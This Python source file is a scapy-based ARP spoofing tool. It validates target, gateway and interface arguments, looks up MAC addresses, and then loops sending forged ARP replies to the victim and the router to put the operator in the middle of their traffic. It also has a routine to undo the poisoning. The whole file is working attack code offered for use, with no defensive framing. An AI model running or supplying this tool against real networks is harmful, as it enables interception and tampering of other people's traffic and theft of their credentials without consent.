#!/usr/bin/env python3

import argparse
import re
import time
import os
import socket
import signal
import sys
import scapy.all as scapy
from termcolor import colored

class ArpSpoof:

    def __init__(self, t, i, r, h):
        self.target_mac = None 
        self.router_mac = None
        self.target = t
        self.interface = i
        self.router_ip = r
        self.hwsrc = h
        self.isValid = None
        self.event = False

    # Verify correct format of given arguments and root privilege
    def verify(self):

        ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"

        match = True if re.match(ip_re, self.target) else False # Verify target format
        match_router = True if re.match(ip_re, self.router_ip) else False # Verify gateway format
        match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", self.hwsrc) else False # Verify mac address format

        interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
        valid_interface = True if self.interface in interfaces else False # Verify if the given Network Interface Name is in the PC

        self.isValid = match and valid_interface and match_router and match_mac # Return True if all is correct

    # Get destination mac from target
    def get_dst_mac(self, ip, retries=20):
        for retry in range(retries):
            try:
                arp_packet = scapy.ARP(pdst=ip)
                broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

                arp_packet = broadcast_packet / arp_packet

                answered_list = scapy.srp(arp_packet, iface=self.interface, timeout=1, verbose=False)[0] # get the anwers

                if answered_list:
                    return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
            except:
                pass

        else:
            return None
        
    # Send spoof message to convert you in a MITM
    def spoof(self, target_ip, interface, router_ip, hwsrc, hwdst):
        arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
        broadcast_packet = scapy.Ether(dst=hwdst)

        packet = broadcast_packet/arp_packet

        scapy.sendp(packet, verbose=False, iface=interface)

    def revert_spoof(self):
        if self.event:
            for _ in range(10):
                # Revert for target
                self.spoof(self.target, self.interface, self.router_ip, self.target_mac, self.router_mac)
                
                # Revert for router
                self.spoof(self.router_ip, self.interface, self.target, self.router_mac, self.target_mac)
                time.sleep(0.3)

    # Main logic
    def start(self, _):

        if self.isValid:
            self.target_mac =  self.get_dst_mac(self.target)
            self.router_mac =  self.get_dst_mac(self.router_ip)
        
            if not self.target_mac or not self.router_mac:
                print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
                sys.exit(1)

            print(colored(f"\n[+] Now you are a Man-In-The-Middle for {self.target} target.", "blue"))
            while not self.event:
                self.spoof(self.target, self.interface, self.router_ip, self.hwsrc, self.target_mac)
                self.spoof(self.router_ip, self.interface, self.target, self.hwsrc, self.router_mac)

                time.sleep(2)

        else:
            print(colored("\n[!] Arguments Incorrect Format.\n", "red"))
            sys.exit(1)
